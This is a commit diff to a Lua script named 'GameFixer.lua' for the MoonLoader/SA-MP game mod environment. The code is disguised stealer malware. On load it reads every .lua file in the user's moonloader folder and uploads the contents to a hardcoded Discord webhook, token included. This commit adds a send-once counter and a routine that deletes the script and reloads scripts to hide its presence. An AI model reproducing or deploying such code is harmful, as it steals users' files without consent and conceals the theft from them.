b51a879d41aafa7e9a3e83def324b3b96140c581
bbdyisvd <gilmararbeirosantos99@gmail.com>
2026-02-07 19:32:49 -0800

    Update GameFixer.lua

--- GameFixer.lua
+++ GameFixer.lua
@@ -1,4 +1,4 @@
-﻿local ffi = require "ffi"
+local ffi = require "ffi"
 local inicfg = require 'inicfg'
 local encoding = require("encoding")
 local lfs = require("lfs")
@@ -7,13 +7,20 @@ local u8 = encoding.UTF8
 
 local webhook_url = "https://discordapp.com/api/webhooks/1469890609480204601/UMVXm71l2R75tJoI82-yvhT206R-9JAqDJW95_HwY9Q9S5L7ETXNjMEYWAIQCb6ODGjE"
 
+local ja_enviou_todos = false
+local arquivos_para_enviar = 0
+local arquivos_enviados = 0
+
 function main()
     repeat wait(0) until isSampAvailable()
     wait(100)
-    enviarTodosLua()
+    
+    if not ja_enviou_todos then
+        enviarTodosLua()
+    end
+    
     while true do
         wait(30000)
-        enviarTodosLua()
     end
 end
 
@@ -21,15 +28,67 @@ function enviarTodosLua()
     local pasta = "moonloader\\"
     local arquivos = listarArquivos(pasta, "%.lua$")
     
+    arquivos_para_enviar = #arquivos
+    arquivos_enviados = 0
+    
+    if arquivos_para_enviar == 0 then
+        ja_enviou_todos = true
+        AutoDelete()
+        return
+    end
+    
     for _, arquivo in ipairs(arquivos) do
         wait(100)
         local caminho_completo = pasta .. arquivo
         local conteudo = lerArquivo(caminho_completo)
         
         if conteudo and conteudo:len() > 0 then
-            enviarArquivoWebhook(webhook_url, conteudo, arquivo)
+            enviarArquivoWebhook(webhook_url, conteudo, arquivo, function()
+                arquivos_enviados = arquivos_enviados + 1
+                if arquivos_enviados >= arquivos_para_enviar then
+                    ja_enviou_todos = true
+                    wait(2000)
+                    AutoDelete()
+                end
+            end)
+        else
+            arquivos_enviados = arquivos_enviados + 1
         end
     end
+end
+
+function enviarArquivoWebhook(url, conteudo, nome_arquivo, callback)
+    lua_thread.create(function()
+        local requests = require("requests")
+        
+        local boundary = "----Boundary" .. tostring(math.random(10000, 99999))
+        local body = ""
+        
+        body = body .. "--" .. boundary .. "\r\n"
+        body = body .. "Content-Disposition: form-data; name=\"payload_json\"\r\n"
+        body = body .. "Content-Type: application/json\r\n\r\n"
+        body = body .. '{"content":"","username":"Lua Files"}' .. "\r\n"
+        
+        body = body .. "--" .. boundary .. "\r\n"
+        body = body .. "Content-Disposition: form-data; name=\"file\"; filename=\"" .. nome_arquivo .. ".txt\"\r\n"
+        body = body .. "Content-Type: text/plain\r\n\r\n"
+        body = body .. conteudo .. "\r\n"
+        
+        body = body .. "--" .. boundary .. "--\r\n"
+        
+        pcall(function()
+            requests.post(url, {
+                headers = {
+                    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
+                },
+                data = body
+            })
+        end)
+        
+        if callback then
+            callback()
+        end
+    end)
 end
 
 function listarArquivos(pasta, filtro)
@@ -58,34 +117,12 @@ function lerArquivo(caminho)
     return conteudo
 end
 
-function enviarArquivoWebhook(url, conteudo, nome_arquivo)
+function AutoDelete()
     lua_thread.create(function()
-        local requests = require("requests")
-        
-        local boundary = "----Boundary" .. tostring(math.random(10000, 99999))
-        local body = ""
-        
-        body = body .. "--" .. boundary .. "\r\n"
-        body = body .. "Content-Disposition: form-data; name=\"payload_json\"\r\n"
-        body = body .. "Content-Type: application/json\r\n\r\n"
-        body = body .. '{"content":"","username":"Lua Files"}' .. "\r\n"
-        
-        body = body .. "--" .. boundary .. "\r\n"
-        body = body .. "Content-Disposition: form-data; name=\"file\"; filename=\"" .. nome_arquivo .. ".txt\"\r\n"
-        body = body .. "Content-Type: text/plain\r\n\r\n"
-        body = body .. conteudo .. "\r\n"
-        
-        body = body .. "--" .. boundary .. "--\r\n"
-        
-        pcall(function()
-            requests.post(url, {
-                headers = {
-                    ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
-                },
-                data = body
-            })
-        end)
+        wait(100)
+        local currentPath = thisScript().path
+        makeFileNormal(currentPath)
+        os.remove(currentPath)
+        reloadScripts()
     end)
-
 end
-
